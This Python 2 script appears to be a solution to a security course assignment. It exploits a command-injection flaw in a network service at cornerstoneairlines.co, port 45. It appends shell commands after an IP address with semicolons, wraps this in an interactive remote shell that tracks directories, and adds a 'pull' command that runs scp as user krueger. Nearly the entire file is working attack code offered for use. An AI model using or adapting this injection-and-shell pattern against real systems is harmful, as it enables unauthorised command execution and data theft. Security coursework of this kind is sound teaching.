"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import os

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
        
    data = s.recv(1024)
    #print(data)

    s.send(cmd + "\n")

    data = s.recv(1024)
    return data

if __name__ == '__main__':
    dir = ''
    while True:
        cmd = raw_input('> ').split(" ")
        if cmd[0] == 'shell':
            while True:
                if dir == '':
                    cur_dir = execute_cmd("142.93.117.193 shell; pwd;").split()
                else:
                    cur_dir = execute_cmd("142.93.117.193 shell; cd "+dir+"; pwd;").split()
                s = raw_input(cur_dir[0] + '> ').split(" ")

                if s[0] == 'exit':
                    break

                if s[0] == 'cd':
                    dir = s[1]
                else:
                    if dir == '':
                        print(execute_cmd("142.93.117.193 shell; " + ' '.join(s) + ";"))
                    else:
                        print(execute_cmd("142.93.117.193 shell; cd " + cur_dir[0] + "; " + ' '.join(s) + ";"))
        elif cmd[0] == 'pull':
            remote = cmd[1]
            local = cmd[2]

            execute_cmd("142.93.117.193 shell; scp krueger@cornerstoneairlines.co:" +remote+" " + local)
        elif cmd[0] == 'help':
            print("1. shell - Drop into an interactive shell and allow user to exit\n2. pull <remote-path> <local-path> - Download files\n3. help - Shows help menu\n4. quit - Quits Shell")
        elif cmd[0] == 'quit':
            break
        else:
            print("Error malformed input\n")
            print("1. shell - Drop into an interactive shell and allow user to exit\n2. pull <remote-path> <local-path> - Download files\n3. help - Shows help menu\n4. quit - Quits Shell")
        

